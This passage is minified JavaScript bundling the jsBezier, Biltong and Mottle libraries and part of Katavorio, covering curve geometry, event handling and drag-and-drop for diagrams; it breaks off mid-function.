function window_eval(str) {
    return;
    window.eval(str);
}
(function () {
    void 0 === Math.sgn && (Math.sgn = function (a) {
        return 0 == a ? 0 : a > 0 ? 1 : -1
    });
    var a = {
        subtract: function (a, b) {
            return {x: a.x - b.x, y: a.y - b.y}
        }, dotProduct: function (a, b) {
            return a.x * b.x + a.y * b.y
        }, square: function (a) {
            return Math.sqrt(a.x * a.x + a.y * a.y)
        }, scale: function (a, b) {
            return {x: a.x * b, y: a.y * b}
        }
    }, b = 64, c = Math.pow(2, -b - 1), d = function (b, c) {
        for (var d = [], e = f(b, c), h = c.length - 1, i = 2 * h - 1, j = g(e, i, d, 0), k = a.subtract(b, c[0]), m = a.square(k), n = 0, o = 0; o < j; o++) {
            k = a.subtract(b, l(c, h, d[o], null, null));
            var p = a.square(k);
            p < m && (m = p, n = d[o])
        }
        return k = a.subtract(b, c[h]), p = a.square(k), p < m && (m = p, n = 1), {location: n, distance: m}
    }, e = function (a, b) {
        var c = d(a, b);
        return {point: l(b, b.length - 1, c.location, null, null), location: c.location}
    }, f = function (b, c) {
        for (var d = c.length - 1, e = 2 * d - 1, f = [], g = [], h = [], i = [], k = [[1, .6, .3, .1], [.4, .6, .6, .4], [.1, .3, .6, 1]], l = 0; l <= d; l++) f[l] = a.subtract(c[l], b);
        for (var l = 0; l <= d - 1; l++) g[l] = a.subtract(c[l + 1], c[l]), g[l] = a.scale(g[l], 3);
        for (var m = 0; m <= d - 1; m++) for (var n = 0; n <= d; n++) h[m] || (h[m] = []), h[m][n] = a.dotProduct(g[m], f[n]);
        for (l = 0; l <= e; l++) i[l] || (i[l] = []), i[l].y = 0, i[l].x = parseFloat(l) / e;
        for (var o = d, p = d - 1, q = 0; q <= o + p; q++) {
            var r = Math.max(0, q - p), s = Math.min(q, o);
            for (l = r; l <= s; l++) j = q - l, i[l + j].y += h[j][l] * k[j][l]
        }
        return i
    }, g = function (a, c, d, e) {
        var f, j, m = [], n = [], o = [], p = [];
        switch (h(a, c)) {
            case 0:
                return 0;
            case 1:
                if (e >= b) return d[0] = (a[0].x + a[c].x) / 2, 1;
                if (i(a, c)) return d[0] = k(a, c), 1
        }
        l(a, c, .5, m, n), f = g(m, c, o, e + 1), j = g(n, c, p, e + 1);
        for (var q = 0; q < f; q++) d[q] = o[q];
        for (var q = 0; q < j; q++) d[q + f] = p[q];
        return f + j
    }, h = function (a, b) {
        var c, d, e = 0;
        c = d = Math.sgn(a[0].y);
        for (var f = 1; f <= b; f++) c = Math.sgn(a[f].y), c != d && e++, d = c;
        return e
    }, i = function (a, b) {
        var d, e, f, g, h, i, j, k, l, m, n, o, p, q, r, s;
        i = a[0].y - a[b].y, j = a[b].x - a[0].x, k = a[0].x * a[b].y - a[b].x * a[0].y;
        for (var t = max_distance_below = 0, u = 1; u < b; u++) {
            var v = i * a[u].x + j * a[u].y + k;
            v > t ? t = v : v < max_distance_below && (max_distance_below = v)
        }
        return n = 0, o = 1, p = 0, q = i, r = j, s = k - t, l = n * r - q * o, m = 1 / l, e = (o * s - r * p) * m, q = i, r = j, s = k - max_distance_below, l = n * r - q * o, m = 1 / l, f = (o * s - r * p) * m, g = Math.min(e, f), h = Math.max(e, f), d = h - g, d < c ? 1 : 0
    }, k = function (a, b) {
        var c = 1, d = a[b].x - a[0].x, e = a[b].y - a[0].y, f = a[0].x - 0;
        return 0 + c * ((d * (a[0].y - 0) - e * f) * (1 / (0 * d - e * c)))
    }, l = function (a, b, c, d, e) {
        for (var f = [[]], g = 0; g <= b; g++) f[0][g] = a[g];
        for (var h = 1; h <= b; h++) for (var g = 0; g <= b - h; g++) f[h] || (f[h] = []), f[h][g] || (f[h][g] = {}), f[h][g].x = (1 - c) * f[h - 1][g].x + c * f[h - 1][g + 1].x, f[h][g].y = (1 - c) * f[h - 1][g].y + c * f[h - 1][g + 1].y;
        if (null != d) for (g = 0; g <= b; g++) d[g] = f[g][0];
        if (null != e) for (g = 0; g <= b; g++) e[g] = f[b - g][g];
        return f[b][0]
    }, m = {}, n = function (a) {
        var b = m[a];
        if (!b) {
            b = [];
            var c = function () {
                return function (b) {
                    return Math.pow(b, a)
                }
            }, d = function () {
                return function (b) {
                    return Math.pow(1 - b, a)
                }
            }, e = function (a) {
                return function (b) {
                    return a
                }
            }, f = function () {
                return function (a) {
                    return a
                }
            }, g = function () {
                return function (a) {
                    return 1 - a
                }
            }, h = function (a) {
                return function (b) {
                    for (var c = 1, d = 0; d < a.length; d++) c *= a[d](b);
                    return c
                }
            };
            b.push(new c);
            for (var i = 1; i < a; i++) {
                for (var j = [new e(a)], k = 0; k < a - i; k++) j.push(new f);
                for (var k = 0; k < i; k++) j.push(new g);
                b.push(new h(j))
            }
            b.push(new d), m[a] = b
        }
        return b
    }, o = function (a, b) {
        for (var c = n(a.length - 1), d = 0, e = 0, f = 0; f < a.length; f++) d += a[f].x * c[f](b), e += a[f].y * c[f](b);
        return {x: d, y: e}
    }, p = function (a, b) {
        return Math.sqrt(Math.pow(a.x - b.x, 2) + Math.pow(a.y - b.y, 2))
    }, q = function (a) {
        return a[0].x == a[1].x && a[0].y == a[1].y
    }, r = function (a, b, c) {
        if (q(a)) return {point: a[0], location: b};
        for (var d = o(a, b), e = 0, f = b, g = c > 0 ? 1 : -1, h = null; e < Math.abs(c);) f += .005 * g, h = o(a, f), e += p(h, d), d = h;
        return {point: h, location: f}
    }, s = function (a) {
        if (q(a)) return 0;
        for (var b = o(a, 0), c = 0, d = 0, e = 1, f = null; d < 1;) d += .005 * e, f = o(a, d), c += p(f, b), b = f;
        return c
    }, t = function (a, b, c) {
        return r(a, b, c).point
    }, u = function (a, b, c) {
        return r(a, b, c).location
    }, v = function (a, b) {
        var c = o(a, b), d = o(a.slice(0, a.length - 1), b), e = d.y - c.y, f = d.x - c.x;
        return 0 == e ? 1 / 0 : Math.atan(e / f)
    }, w = function (a, b, c) {
        var d = r(a, b, c);
        return d.location > 1 && (d.location = 1), d.location < 0 && (d.location = 0), v(a, d.location)
    }, x = function (a, b, c, d) {
        d = null == d ? 0 : d;
        var e = r(a, b, d), f = v(a, e.location), g = Math.atan(-1 / f), h = c / 2 * Math.sin(g),
            i = c / 2 * Math.cos(g);
        return [{x: e.point.x + i, y: e.point.y + h}, {x: e.point.x - i, y: e.point.y - h}]
    }, y = this.jsBezier = {
        distanceFromCurve: d,
        gradientAtPoint: v,
        gradientAtPointAlongCurveFrom: w,
        nearestPointOnCurve: e,
        pointOnCurve: o,
        pointAlongCurveFrom: t,
        perpendicularToCurveAt: x,
        locationAlongCurveFrom: u,
        getLength: s,
        version: "0.9.0"
    };
    "undefined" != typeof exports && (exports.jsBezier = y)
}).call("undefined" != typeof window ? window : this), function () {
    "use strict";
    var a = this, b = a.Biltong = {version: "0.4.0"};
    "undefined" != typeof exports && (exports.Biltong = b);
    var c = function (a) {
        return "[object Array]" === Object.prototype.toString.call(a)
    }, d = function (a, b, d) {
        return a = c(a) ? a : [a.x, a.y], b = c(b) ? b : [b.x, b.y], d(a, b)
    }, e = b.gradient = function (a, b) {
        return d(a, b, function (a, b) {
            return b[0] == a[0] ? b[1] > a[1] ? 1 / 0 : -1 / 0 : b[1] == a[1] ? b[0] > a[0] ? 0 : -0 : (b[1] - a[1]) / (b[0] - a[0])
        })
    }, f = (b.normal = function (a, b) {
        return -1 / e(a, b)
    }, b.lineLength = function (a, b) {
        return d(a, b, function (a, b) {
            return Math.sqrt(Math.pow(b[1] - a[1], 2) + Math.pow(b[0] - a[0], 2))
        })
    }, b.quadrant = function (a, b) {
        return d(a, b, function (a, b) {
            return b[0] > a[0] ? b[1] > a[1] ? 2 : 1 : b[0] == a[0] ? b[1] > a[1] ? 2 : 1 : b[1] > a[1] ? 3 : 4
        })
    }), g = (b.theta = function (a, b) {
        return d(a, b, function (a, b) {
            var c = e(a, b), d = Math.atan(c), g = f(a, b);
            return 4 != g && 3 != g || (d += Math.PI), d < 0 && (d += 2 * Math.PI), d
        })
    }, b.intersects = function (a, b) {
        var c = a.x, d = a.x + a.w, e = a.y, f = a.y + a.h, g = b.x, h = b.x + b.w, i = b.y, j = b.y + b.h;
        return c <= g && g <= d && e <= i && i <= f || c <= h && h <= d && e <= i && i <= f || c <= g && g <= d && e <= j && j <= f || c <= h && g <= d && e <= j && j <= f || g <= c && c <= h && i <= e && e <= j || g <= d && d <= h && i <= e && e <= j || g <= c && c <= h && i <= f && f <= j || g <= d && c <= h && i <= f && f <= j
    }, b.encloses = function (a, b, c) {
        var d = a.x, e = a.x + a.w, f = a.y, g = a.y + a.h, h = b.x, i = b.x + b.w, j = b.y, k = b.y + b.h,
            l = function (a, b, d, e) {
                return c ? a <= b && d >= e : a < b && d > e
            };
        return l(d, h, e, i) && l(f, j, g, k)
    }, [null, [1, -1], [1, 1], [-1, 1], [-1, -1]]), h = [null, [-1, -1], [-1, 1], [1, 1], [1, -1]];
    b.pointOnLine = function (a, b, c) {
        var d = e(a, b), i = f(a, b), j = c > 0 ? g[i] : h[i], k = Math.atan(d), l = Math.abs(c * Math.sin(k)) * j[1],
            m = Math.abs(c * Math.cos(k)) * j[0];
        return {x: a.x + m, y: a.y + l}
    }, b.perpendicularLineTo = function (a, b, c) {
        var d = e(a, b), f = Math.atan(-1 / d), g = c / 2 * Math.sin(f), h = c / 2 * Math.cos(f);
        return [{x: b.x + h, y: b.y + g}, {x: b.x - h, y: b.y - g}]
    }
}.call("undefined" != typeof window ? window : this), function () {
    "use strict";
    var a = this, b = {android: navigator.userAgent.toLowerCase().indexOf("android") > -1}, c = function (a, b, c) {
            c = c || a.parentNode;
            for (var d = c.querySelectorAll(b), e = 0; e < d.length; e++) if (d[e] === a) return !0;
            return !1
        }, d = function (a) {
            return "string" == typeof a || a.constructor === String ? document.getElementById(a) : a
        }, e = function (a) {
            return a.srcElement || a.target
        }, f = function (a, b, c, d) {
            if (d) {
                if (void 0 !== a.path && a.path.indexOf) return {path: a.path, end: a.path.indexOf(c)};
                var e = {path: [], end: -1}, f = function (a) {
                    e.path.push(a), a === c ? e.end = e.path.length - 1 : null != a.parentNode && f(a.parentNode)
                };
                return f(b), e
            }
            return {path: [b], end: 1}
        }, g = function (a, b) {
            for (var c = 0, d = a.length; c < d && a[c] != b; c++) ;
            c < a.length && a.splice(c, 1)
        }, h = 1, i = function (a, b, c) {
            var d = h++;
            return a.__ta = a.__ta || {}, a.__ta[b] = a.__ta[b] || {}, a.__ta[b][d] = c, c.__tauid = d, d
        }, j = function (a, b, c) {
            if (a.__ta && a.__ta[b] && delete a.__ta[b][c.__tauid], c.__taExtra) {
                for (var d = 0; d < c.__taExtra.length; d++) F(a, c.__taExtra[d][0], c.__taExtra[d][1]);
                c.__taExtra.length = 0
            }
            c.__taUnstore && c.__taUnstore()
        }, k = function (a, b, d, g) {
            if (null == a) return d;
            var h = a.split(","), i = function (g) {
                i.__tauid = d.__tauid;
                var j = e(g), k = j, l = f(g, j, b, null != a);
                if (-1 != l.end) for (var m = 0; m < l.end; m++) {
                    k = l.path[m];
                    for (var n = 0; n < h.length; n++) c(k, h[n], b) && d.apply(k, arguments)
                }
            };
            return l(d, g, i), i
        }, l = function (a, b, c) {
            a.__taExtra = a.__taExtra || [], a.__taExtra.push([b, c])
        }, m = function (a, b, c, d) {
            if (s && u[b]) {
                var e = k(d, a, c, u[b]);
                E(a, u[b], e, c)
            }
            "focus" === b && null == a.getAttribute("tabindex") && a.setAttribute("tabindex", "1"), E(a, b, k(d, a, c, b), c)
        }, n = function (a, b, c, d) {
            if (null == a.__taSmartClicks) {
                var f = function (b) {
                    a.__tad = y(b)
                }, h = function (b) {
                    a.__tau = y(b)
                }, i = function (b) {
                    if (a.__tad && a.__tau && a.__tad[0] === a.__tau[0] && a.__tad[1] === a.__tau[1]) for (var c = 0; c < a.__taSmartClicks.length; c++) a.__taSmartClicks[c].apply(e(b), [b])
                };
                m(a, "mousedown", f, d), m(a, "mouseup", h, d), m(a, "click", i, d), a.__taSmartClicks = []
            }
            a.__taSmartClicks.push(c), c.__taUnstore = function () {
                g(a.__taSmartClicks, c)
            }
        }, o = {tap: {touches: 1, taps: 1}, dbltap: {touches: 1, taps: 2}, contextmenu: {touches: 2, taps: 1}},
        p = function (a, b) {
            return function (d, h, i, j) {
                if ("contextmenu" == h && t) m(d, h, i, j); else {
                    if (null == d.__taTapHandler) {
                        var k = d.__taTapHandler = {
                            tap: [],
                            dbltap: [],
                            contextmenu: [],
                            down: !1,
                            taps: 0,
                            downSelectors: []
                        }, l = function (g) {
                            for (var h = e(g), i = f(g, h, d, null != j), l = !1, m = 0; m < i.end; m++) {
                                if (l) return;
                                h = i.path[m];
                                for (var n = 0; n < k.downSelectors.length; n++) if (null == k.downSelectors[n] || c(h, k.downSelectors[n], d)) {
                                    k.down = !0, setTimeout(p, a), setTimeout(q, b), l = !0;
                                    break
                                }
                            }
                        }, n = function (a) {
                            if (k.down) {
                                var b, g, h = e(a);
                                k.taps++;
                                var i = D(a);
                                for (var j in o) if (o.hasOwnProperty(j)) {
                                    var l = o[j];
                                    if (l.touches === i && (1 === l.taps || l.taps === k.taps)) for (var m = 0; m < k[j].length; m++) {
                                        g = f(a, h, d, null != k[j][m][1]);
                                        for (var n = 0; n < g.end; n++) if (b = g.path[n], null == k[j][m][1] || c(b, k[j][m][1], d)) {
                                            k[j][m][0].apply(b, [a]);
                                            break
                                        }
                                    }
                                }
                            }
                        }, p = function () {
                            k.down = !1
                        }, q = function () {
                            k.taps = 0
                        };
                        m(d, "mousedown", l), m(d, "mouseup", n)
                    }
                    d.__taTapHandler.downSelectors.push(j), d.__taTapHandler[h].push([i, j]), i.__taUnstore = function () {
                        g(d.__taTapHandler[h], i)
                    }
                }
            }
        }, q = function (a, b, c, d) {
            for (var e in c.__tamee[a]) c.__tamee[a].hasOwnProperty(e) && c.__tamee[a][e].apply(d, [b])
        }, r = function () {
            var a = [];
            return function (b, d, f, g) {
                if (!b.__tamee) {
                    b.__tamee = {over: !1, mouseenter: [], mouseexit: []};
                    var h = function (d) {
                        var f = e(d);
                        (null == g && f == b && !b.__tamee.over || c(f, g, b) && (null == f.__tamee || !f.__tamee.over)) && (q("mouseenter", d, b, f), f.__tamee = f.__tamee || {}, f.__tamee.over = !0, a.push(f))
                    }, j = function (d) {
                        for (var f = e(d), g = 0; g < a.length; g++) f != a[g] || c(d.relatedTarget || d.toElement, "*", f) || (f.__tamee.over = !1, a.splice(g, 1), q("mouseexit", d, b, f))
                    };
                    E(b, "mouseover", k(g, b, h, "mouseover"), h), E(b, "mouseout", k(g, b, j, "mouseout"), j)
                }
                f.__taUnstore = function () {
                    delete b.__tamee[d][f.__tauid]
                }, i(b, d, f), b.__tamee[d][f.__tauid] = f
            }
        }, s = "ontouchstart" in document.documentElement, t = "onmousedown" in document.documentElement,
        u = {mousedown: "touchstart", mouseup: "touchend", mousemove: "touchmove"}, v = function () {
            var a = -1;
            if ("Microsoft Internet Explorer" == navigator.appName) {
                var b = navigator.userAgent;
                null != new RegExp("MSIE ([0-9]{1,}[.0-9]{0,})").exec(b) && (a = parseFloat(RegExp.$1))
            }
            return a
        }(), w = v > -1 && v < 9, x = function (a, b) {
            if (null == a) return [0, 0];
            var c = C(a), d = B(c, 0);
            return [d[b + "X"], d[b + "Y"]]
        }, y = function (a) {
            return null == a ? [0, 0] : w ? [a.clientX + document.documentElement.scrollLeft, a.clientY + document.documentElement.scrollTop] : x(a, "page")
        }, z = function (a) {
            return x(a, "screen")
        }, A = function (a) {
            return x(a, "client")
        }, B = function (a, b) {
            return a.item ? a.item(b) : a[b]
        }, C = function (a) {
            return a.touches && a.touches.length > 0 ? a.touches : a.changedTouches && a.changedTouches.length > 0 ? a.changedTouches : a.targetTouches && a.targetTouches.length > 0 ? a.targetTouches : [a]
        }, D = function (a) {
            return C(a).length
        }, E = function (a, b, c, d) {
            if (i(a, b, c), d.__tauid = c.__tauid, a.addEventListener) a.addEventListener(b, c, !1); else if (a.attachEvent) {
                var e = b + c.__tauid;
                a["e" + e] = c, a[e] = function () {
                    a["e" + e] && a["e" + e](window.event)
                }, a.attachEvent("on" + b, a[e])
            }
        }, F = function (a, b, c) {
            null != c && G(a, function () {
                var e = d(this);
                if (j(e, b, c), null != c.__tauid) if (e.removeEventListener) e.removeEventListener(b, c, !1), s && u[b] && e.removeEventListener(u[b], c, !1); else if (this.detachEvent) {
                    var f = b + c.__tauid;
                    e[f] && e.detachEvent("on" + b, e[f]), e[f] = null, e["e" + f] = null
                }
                c.__taTouchProxy && F(a, c.__taTouchProxy[1], c.__taTouchProxy[0])
            })
        }, G = function (a, b) {
            if (null != a) {
                a = "undefined" != typeof Window && "unknown" != typeof a.top && a == a.top ? [a] : "string" != typeof a && null == a.tagName && null != a.length ? a : "string" == typeof a ? document.querySelectorAll(a) : [a];
                for (var c = 0; c < a.length; c++) b.apply(a[c])
            }
        };
    a.Mottle = function (a) {
        a = a || {};
        var c = a.clickThreshold || 250, e = a.dblClickThreshold || 450, f = new r, g = new p(c, e), h = a.smartClicks,
            i = function (a, b, c, e) {
                null != c && G(a, function () {
                    var a = d(this);
                    h && "click" === b ? n(a, b, c, e) : "tap" === b || "dbltap" === b || "contextmenu" === b ? g(a, b, c, e) : "mouseenter" === b || "mouseexit" == b ? f(a, b, c, e) : m(a, b, c, e)
                })
            };
        this.remove = function (a) {
            return G(a, function () {
                var a = d(this);
                if (a.__ta) for (var b in a.__ta) if (a.__ta.hasOwnProperty(b)) for (var c in a.__ta[b]) a.__ta[b].hasOwnProperty(c) && F(a, b, a.__ta[b][c]);
                a.parentNode && a.parentNode.removeChild(a)
            }), this
        }, this.on = function (a, b, c, d) {
            var e = arguments[0], f = 4 == arguments.length ? arguments[2] : null, g = arguments[1],
                h = arguments[arguments.length - 1];
            return i(e, g, h, f), this
        }, this.off = function (a, b, c) {
            return F(a, b, c), this
        }, this.trigger = function (a, c, e, f) {
            var g = t && ("undefined" == typeof MouseEvent || null == e || e.constructor === MouseEvent),
                h = s && !t && u[c] ? u[c] : c, i = !(s && !t && u[c]), j = y(e), k = z(e), l = A(e);
            return G(a, function () {
                var a, m = d(this);
                e = e || {screenX: k[0], screenY: k[1], clientX: l[0], clientY: l[1]};
                var n = function (a) {
                    f && (a.payload = f)
                }, o = {
                    TouchEvent: function (a) {
                        var b = document.createTouch(window, m, 0, j[0], j[1], k[0], k[1], l[0], l[1], 0, 0, 0, 0),
                            c = document.createTouchList(b), d = document.createTouchList(b),
                            e = document.createTouchList(b);
                        a.initTouchEvent(h, !0, !0, window, null, k[0], k[1], l[0], l[1], !1, !1, !1, !1, c, d, e, 1, 0)
                    }, MouseEvents: function (a) {
                        if (a.initMouseEvent(h, !0, !0, window, 0, k[0], k[1], l[0], l[1], !1, !1, !1, !1, 1, m), b.android) {
                            var c = document.createTouch(window, m, 0, j[0], j[1], k[0], k[1], l[0], l[1], 0, 0, 0, 0);
                            a.touches = a.targetTouches = a.changedTouches = document.createTouchList(c)
                        }
                    }
                };
                if (document.createEvent) {
                    var p = !i && !g && s && u[c] && !b.android, q = p ? "TouchEvent" : "MouseEvents";
                    a = document.createEvent(q), o[q](a), n(a), m.dispatchEvent(a)
                } else document.createEventObject && (a = document.createEventObject(), a.eventType = a.eventName = h, a.screenX = k[0], a.screenY = k[1], a.clientX = l[0], a.clientY = l[1], n(a), m.fireEvent("on" + h, a))
            }), this
        }
    }, a.Mottle.consume = function (a, b) {
        a.stopPropagation ? a.stopPropagation() : a.returnValue = !1, !b && a.preventDefault && a.preventDefault()
    }, a.Mottle.pageLocation = y, a.Mottle.setForceTouchEvents = function (a) {
        s = a
    }, a.Mottle.setForceMouseEvents = function (a) {
        t = a
    }, a.Mottle.version = "0.8.0", "undefined" != typeof exports && (exports.Mottle = a.Mottle)
}.call("undefined" == typeof window ? this : window), function () {
    "use strict";
    var a = this, b = function (a, b, c) {
        return -1 === a.indexOf(b) && (c ? a.unshift(b) : a.push(b), !0)
    }, c = function (a, b) {
        var c = a.indexOf(b);
        -1 !== c && a.splice(c, 1)
    }, d = function (a, b) {
        for (var c = [], d = 0; d < a.length; d++) -1 === b.indexOf(a[d]) && c.push(a[d]);
        return c
    }, e = function (a) {
        return null != a && ("string" == typeof a || a.constructor === String)
    }, f = function (a) {
        var b = a.getBoundingClientRect(), c = document.body, d = document.documentElement,
            e = window.pageYOffset || d.scrollTop || c.scrollTop,
            f = window.pageXOffset || d.scrollLeft || c.scrollLeft, g = d.clientTop || c.clientTop || 0,
            h = d.clientLeft || c.clientLeft || 0, i = b.top + e - g, j = b.left + f - h;
        return {top: Math.round(i), left: Math.round(j)}
    }, g = function (a, b, c) {
        c = c || a.parentNode;
        for (var d = c.querySelectorAll(b), e = 0; e < d.length; e++) if (d[e] === a) return !0;
        return !1
    }, h = function (a, b, c) {
        if (g(b, c, a)) return b;
        for (var d = b.parentNode; null != d && d !== a;) {
            if (g(d, c, a)) return d;
            d = d.parentNode
        }
    }, i = function () {
        var a = -1;
        if ("Microsoft Internet Explorer" === navigator.appName) {
            var b = navigator.userAgent;
            null != new RegExp("MSIE ([0-9]{1,}[.0-9]{0,})").exec(b) && (a = parseFloat(RegExp.$1))
        }
        return a
    }(), j = 10, k = 10, l = i > -1 && i < 9, m = 9 === i, n = function (a) {
        if (l) return [a.clientX + document.documentElement.scrollLeft, a.clientY + document.documentElement.scrollTop];
        var b = p(a), c = o(b, 0);
        return m ? [c.pageX || c.clientX, c.pageY || c.clientY] : [c.pageX, c.pageY]
    }, o = function (a, b) {
        return a.item ? a.item(b) : a[b]
    }, p = function (a) {
        return a.touches && a.touches.length > 0 ? a.touches : a.changedTouches && a.changedTouches.length > 0 ? a.changedTouches : a.targetTouches && a.targetTouches.length > 0 ? a.targetTouches : [a]
    }, q = {
        draggable: "katavorio-draggable",
        droppable: "katavorio-droppable",
        drag: "katavorio-drag",
        selected: "katavorio-drag-selected",
        active: "katavorio-drag-active",
        hover: "katavorio-drag-hover",
        noSelect: "katavorio-drag-no-select",
        ghostProxy: "katavorio-ghost-proxy",
        clonedDrag: "katavorio-clone-drag"
    }, r = ["stop", "start", "drag", "drop", "over", "out", "beforeStart"], s = function () {
    }, t = function () {
        return !0
    }, u = function (a, b, c) {
        for (var d = 0; d < a.length; d++) a[d] != c && b(a[d])
    }, v = function (a, b, c, d) {
        u(a, function (a) {
            a.setActive(b), b && a.updatePosition(), c && a.setHover(d, b)
        })
    }, w = function (a, b) {
        if (null != a) {
            a = e(a) || null != a.tagName || null == a.length ? [a] : a;
            for (var c = 0; c < a.length; c++) b.apply(a[c], [a[c]])
        }
    }, x = function (a) {
        a.stopPropagation ? (a.stopPropagation(), a.preventDefault()) : a.returnValue = !1
    }, y = function (a, b, c) {
        var d = a.srcElement || a.target;
        return !g(d, c.getInputFilterSelector(), b)
    }, z = function (a, b, c, d) {
        this.params = b || {}, this.el = a, this.params.addClass(this.el, this._class), this.uuid = E();
        var e = !0;
        return this.setEnabled = function (a) {
            e = a
        }, this.isEnabled = function () {
            return e
        }, this.toggleEnabled = function () {
            e = !e
        }, this.setScope = function (a) {
            this.scopes = a ? a.split(/\s+/) : [d]
        }, this.addScope = function (a) {
            var b = {};
            w(this.scopes, function (a) {
                b[a] = !0
            }), w(a ? a.split(/\s+/) : [], function (a) {
                b[a] = !0
            }), this.scopes = [];
            for (var c in b) this.scopes.push(c)
        }, this.removeScope = function (a) {
            var b = {};
            w(this.scopes, function (a) {
                b[a] = !0
            }), w(a ? a.split(/\s+/) : [], function (a) {
                delete b[a]
            }), this.scopes = [];
            for (var c in b) this.scopes.push(c)
        }, this.toggleScope = function (a) {
            var b = {};
            w(this.scopes, function (a) {
                b[a] = !0
            }), w(a ? a.split(/\s+/) : [], function (a) {
                b[a] ? delete b[a] : b[a] = !0
            }), this.scopes = [];
            for (var c in b) this.scopes.push(c)
        }, this.setScope(b.scope), this.k = b.katavorio, b.katavorio
    }, A = function () {
        return !0
    }, B = function () {
        return !1
    }, C = function (a, b, c, d) {
        this._class = c.draggable;
        var i = z.apply(this, arguments);
        this.rightButtonCanDrag = this.params.rightButtonCanDrag;
        var l = [0, 0], m = null, o = null, p = [0, 0], r = !1, s = !1 !== this.params.consumeStartEvent, u = this.el,
            w = this.params.clone, C = (this.params.scroll, !1 !== b.multipleDrop), D = !1,
            G = !0 === b.ghostProxy ? A : b.ghostProxy && "function" == typeof b.ghostProxy ? b.ghostProxy : B,
            H = function (a) {
                return a.cloneNode(!0)
            }, I = b.selector, J = null, K = b.snapThreshold, L = function (a, b, c, d, e) {
                var f = Math.floor(a[0] / b), g = b * f, h = g + b,
                    i = Math.abs(a[0] - g) <= d ? g : Math.abs(h - a[0]) <= d ? h : a[0], j = Math.floor(a[1] / c),
                    k = c * j, l = k + c;
                return [i, Math.abs(a[1] - k) <= e ? k : Math.abs(l - a[1]) <= e ? l : a[1]]
            };
        this.posses = [], this.posseRoles = {}, this.toGrid = function (a) {
            if (null == this.params.grid) return a;
            var b = this.params.grid ? this.params.grid[0] / 2 : K || j / 2,
                c = this.params.grid ? this.params.grid[1] / 2 : K || k / 2;
            return L(a, this.params.grid[0], this.params.grid[1], b, c)
        }, this.snap = function (a, b) {
            if (null != u) {
                a = a || (this.params.grid ? this.params.grid[0] : j), b = b || (this.params.grid ? this.params.grid[1] : k);
                var c = this.params.getPosition(u), d = this.params.grid ? this.params.grid[0] / 2 : K,
                    e = this.params.grid ? this.params.grid[1] / 2 : K;
                this.params.setPosition(u, L(c, a, b, d, e))
            }
        }, this.setUseGhostProxy = function (a) {
            G = a ? A : B
        };
        var M, N = function (a) {
            return !1 === b.allowNegative ? [Math.max(0, a[0]), Math.max(0, a[1])] : a
        }, O = function (a) {
            M = "function" == typeof a ? a : a ? function (a, b, c, d) {
                return N([Math.max(0, Math.min(c.w - d[0], a[0])), Math.max(0, Math.min(c.h - d[1], a[1]))])
            }.bind(this) : function (a) {
                return N(a)
            }
        }.bind(this);
        O("function" == typeof this.params.constrain ? this.params.constrain : this.params.constrain || this.params.containment), this.setConstrain = function (a) {
            O(a)
        };
        var P;
        this.setRevert = function (a) {
            P = a
        };
        var Q = function (a) {
            return "function" == typeof a ? (a._katavorioId = E(), a._katavorioId) : a
        }, R = {}, S = function (a) {
            for (var b in R) {
                var c = R[b], d = c[0](a);
                if (c[1] && (d = !d), !d) return !1
            }
            return !0
        }, T = this.setFilter = function (b, c) {
            if (b) {
                var d = Q(b);
                R[d] = [function (c) {
                    var d, f = c.srcElement || c.target;
                    return e(b) ? d = g(f, b, a) : "function" == typeof b && (d = b(c, a)), d
                }, !1 !== c]
            }
        };
        this.addFilter = T, this.removeFilter = function (a) {
            var b = "function" == typeof a ? a._katavorioId : a;
            delete R[b]
        };
        this.clearAllFilters = function () {
            R = {}
        }, this.canDrag = this.params.canDrag || t;
        var U, V = [], W = [];
        this.downListener = function (a) {
            if ((this.rightButtonCanDrag || 3 !== a.which && 2 !== a.button) && this.isEnabled() && this.canDrag()) if (S(a) && y(a, this.el, this.k)) {
                if (I) {
                    if (null == (J = h(this.el, a.target || a.srcElement, I))) return
                } else J = this.el;
                if (w) if (u = J.cloneNode(!0), this.params.addClass(u, q.clonedDrag), u.setAttribute("id", null), u.style.position = "absolute", null != this.params.parent) {
                    var b = this.params.getPosition(this.el);
                    u.style.left = b[0] + "px", u.style.top = b[1] + "px", this.params.parent.appendChild(u)
                } else {
                    var d = f(J);
                    u.style.left = d.left + "px", u.style.top = d.top + "px", document.body.appendChild(u)
                } else u = J;
                s && x(a), l = n(a), this.params.bind(document, "mousemove", this.moveListener), this.params.bind(document, "mouseup", this.upListener), i.markSelection(this), i.markPosses(this), this.params.addClass(document.body, c.noSelect), Y("beforeStart", {
                    el: this.el,
                    pos: m,
                    e: a,
                    drag: this
                })
            } else this.params.consumeFilteredEvents && x(a)
        }.bind(this), this.moveListener = function (a) {
            if (l) {
                if (!r) {
                    if (!1 !== Y("start", {el: this.el, pos: m, e: a, drag: this})) {
                        if (!l) return;
                        this.mark(!0), r = !0
                    } else this.abort()
                }
                if (l) {
                    W.length = 0;
                    var b = n(a), c = b[0] - l[0], d = b[1] - l[1], e = this.params.ignoreZoom ? 1 : i.getZoom();
                    c /= e, d /= e, this.moveBy(c, d, a), i.updateSelection(c, d, this), i.updatePosses(c, d, this)
                }
            }
        }.bind(this), this.upListener = function (a) {
            l && (l = null, this.params.unbind(document, "mousemove", this.moveListener), this.params.unbind(document, "mouseup", this.upListener), this.params.removeClass(document.body, c.noSelect), this.unmark(a), i.unmarkSelection(this, a), i.unmarkPosses(this, a), this.stop(a), i.notifySelectionDragStop(this, a), i.notifyPosseDragStop(this, a), r = !1, w && (u && u.parentNode && u.parentNode.removeChild(u), u = null), W.length = 0, P && !0 === P(this.el, this.params.getPosition(this.el)) && (this.params.setPosition(this.el, m), Y("revert", this.el)))
        }.bind(this), this.getFilters = function () {
            return R
        }, this.abort = function () {
            null != l && this.upListener()
        }, this.getDragElement = function (a) {
            return a ? J || this.el : u || this.el
        };
        var X = {start: [], drag: [], stop: [], over: [], out: [], beforeStart: [], revert: []};
        b.events.start && X.start.push(b.events.start), b.events.beforeStart && X.beforeStart.push(b.events.beforeStart), b.events.stop && X.stop.push(b.events.stop), b.events.drag && X.drag.push(b.events.drag), b.events.revert && X.revert.push(b.events.revert), this.on = function (a, b) {
            X[a] && X[a].push(b)
        }, this.off = function (a, b) {
            if (X[a]) {
                for (var c = [], d = 0; d < X[a].length; d++) X[a][d] !== b && c.push(X[a][d]);
                X[a] = c
            }
        };
        var Y = function (a, b) {
            var c = null;
            if (X[a]) for (var d = 0; d < X[a].length; d++) try {
                var e = X[a][d](b);
                null != e && (c = e)
            } catch (a) {
            }
            return c
        };
        this.notifyStart = function (a) {
